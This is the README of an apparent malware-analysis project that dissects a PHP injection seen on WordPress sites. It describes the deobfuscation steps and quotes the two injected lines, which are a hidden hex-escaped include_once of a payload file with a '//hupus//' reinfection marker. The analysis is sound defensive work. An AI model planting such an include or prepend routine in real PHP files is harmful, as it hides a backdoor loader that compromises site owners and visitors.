# Code Injection

I tried out the method of code injection exemplified by `pi.php`.
This directory contain my work.

## Injection process and results

* `inject.php` - code extracted and simplified from `pi.php` examples.
* `index.php` - sacrificial file, exists to get injected.
* `8291318` - PHP written by `inject.php` when it found `index.php`

`inject.php`, when executed, finds `index.php`.
`inject.php` prepends two lines of of code to any file named
like `index.php` meeting its criteria.
The two lines of code:

    <?PHP
    @include_once("\x2e\x2f\x2f\x38\x32\x39\x31\x33\x31\x38");//hupus// ?>

The "//hupus//" marks `index.php` so that later compromises of the same WordPress site
don't have extraneous injections made over and over.
The string "\x2e\x2f\x2f\x38\x32\x39\x31\x33\x31\x38" is just an alternate
way of writing "8291318" in PHP source.

## Deobfuscation of injected code

1. `dc1.php` - copy of `8291318`, with "print" substituted for "eval"
2. `dc2.php` - output of `php dc1.php`, again with "print" substituted for "eval"
3. `dc3.php` - output of `php dc2.php`. The code that does something when it gets eval'ed
4. `f3.php` - pretty-printed `dc3.php`

## Investigate injected code

I extracted these files from `f3.php`, the pretty-printed injected code
to try out pieces of its functionality.

* `location.test.php` - calculate what `linkjs.club` URL might look like.
* `wlyphget.php` - try to retrieve the HTML templates.
